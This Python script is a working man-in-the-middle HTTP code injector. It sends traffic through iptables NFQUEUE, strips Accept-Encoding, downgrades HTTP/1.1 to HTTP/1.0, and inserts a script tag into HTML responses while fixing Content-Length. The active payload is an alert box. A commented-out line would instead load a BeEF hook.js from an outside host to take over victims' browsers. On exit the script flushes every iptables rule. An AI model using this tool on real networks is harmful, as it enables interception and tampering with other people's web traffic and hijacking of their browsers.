#!/usr/bin/env python

import netfilterqueue as nfq
import scapy.all as scapy
import re
import subprocess

def iptables(machine):
    if machine == 'host':
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '007'])
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '007'])
    else:
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '007'])

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            # load = str(scapy_packet[scapy.Raw].load)
            load = scapy_packet[scapy.Raw].load.decode('utf-8')
            if scapy_packet[scapy.TCP].dport == 80:
                print('[+] Request...')
                # print(scapy_packet.show())
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                load = load.replace('HTTP/1.1', 'HTTP/1.0')

            elif scapy_packet[scapy.TCP].sport == 80:
                print('[+] Response...')
                # print(scapy_packet.show())
                # injection_script = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                injection_script = '<sCript>alert("hello buddy ...");</scriPt>'
                load = load.replace('</body>', injection_script + '</body>')
                primeval_content_length = re.search('(?:Content-Length:\s)(\d*)', load)
                if primeval_content_length and 'text/html' in load:
                    content_length = primeval_content_length.group(1)
                    new_content_length = int(content_length) + len(injection_script)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        # except UnicodeError:
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = nfq.NetfilterQueue()
queue.bind(0o7, process_packet)
try:
    iptables('host')
    queue.run()
except KeyboardInterrupt:
    print('[+] Restoring iptables...')
    subprocess.call(['iptables', '-F'])